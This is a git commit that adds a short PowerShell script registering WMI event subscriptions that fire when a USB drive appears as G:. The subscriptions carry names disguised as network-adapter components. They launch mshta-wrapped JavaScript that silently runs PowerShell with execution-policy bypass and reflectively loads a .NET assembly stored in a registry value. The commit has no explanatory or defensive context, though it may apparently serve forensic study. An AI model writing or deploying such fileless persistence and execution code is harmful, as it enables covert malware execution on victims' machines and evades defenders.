f8da99f2651f186b5caadede1d66e673c8a435ce
elosdfir <191758685+elosdfir@users.noreply.github.com>
2026-03-01 16:31:22 +0000

    Add files via upload

---
+++ wmi.ps1
@@ -0,0 +1,8 @@
+$usb = "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2 AND DriveName = 'G:'"
+
+$filter = Register-CimIndicationEvent -Namespace root\cimv2 -Query $usb -SourceIdentifier "NetLbfoTeamNic"
+
+$injection = {
+    Start-Process cmd.exe -ArgumentList '/c mshta "javascript:close(new ActiveXObject(''WScript.Shell'').run(''powershell -ExecutionPolicy Bypass -Command \"[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::ClassesRoot.OpenSubKey(\\\".osk\\\").GetValue(\\\"CryptA\\\")).EntryPoint.Invoke($null,$null)\"'' ,0));"'
+}
+Register-CimIndicationEvent -Namespace root\cimv2 -Query $usb -Action $injection -SourceIdentifier "NetLbfoTeamMember"
